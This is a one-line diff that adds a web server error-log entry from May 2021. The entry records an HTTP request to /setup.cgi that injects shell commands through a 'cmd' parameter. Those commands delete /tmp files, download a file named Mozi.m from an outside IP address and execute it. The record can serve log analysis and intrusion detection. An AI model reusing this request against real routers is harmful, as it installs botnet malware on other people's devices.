@@ -1,0 +1,1 @@
+ERROR|06/May/2021 02:53:46|basehttp|12957|140370911487744|"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://105.153.138.34:41619/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 59
